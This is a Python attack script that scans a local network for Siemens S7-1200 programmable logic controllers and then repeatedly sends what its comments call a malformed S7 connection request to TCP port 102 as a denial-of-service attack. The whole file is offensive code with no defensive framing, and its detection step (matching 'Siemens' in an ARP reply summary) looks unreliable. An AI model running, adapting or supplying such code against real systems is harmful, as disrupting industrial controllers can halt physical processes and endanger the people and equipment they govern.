import scapy.all as scapy
import socket
import time

# Function to discover Siemens S7-1200 PLC in the network
def discover_plc():
    print("[*] Scanning for Siemens S7-1200 PLC...")
    target_ip_range = "192.168.1.0/24"  # Change this to match your network range
    ans, _ = scapy.arping(target_ip_range, timeout=2, verbose=False)

    for sent, received in ans:
        if b"Siemens" in received.summary().encode():  # Check fingerprint of Siemens PLC
            print(f"[+] PLC Found: {received.psrc}")
            return received.psrc
    
    print("[-] No Siemens S7-1200 PLC found on the network.")
    return None

# Function to perform Denial-of-Service on the PLC
def dos_attack(target_ip, duration=10):
    print(f"[*] Initiating DoS attack on PLC ({target_ip}) for {duration} seconds...")

    payload = b"\x03\x00\x00\x16\x11\xe0\x00\x00\x00\x01\x00\xc1\x02\x01\x00\xc2\x02\x01\x02\xc0\x01\x09"  # Malformed S7 connection request

    end_time = time.time() + duration  # Run attack for specified duration
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, 102))  # Siemens S7comm protocol runs on TCP port 102
            sock.send(payload)
            sock.close()
        except Exception as e:
            pass  # Ignore errors to continue attack
    print("[+] Attack completed.")

# Main Execution
plc_ip = discover_plc()
if plc_ip:
    dos_attack(plc_ip)
else:
    print("[-] Exiting. No PLC found.")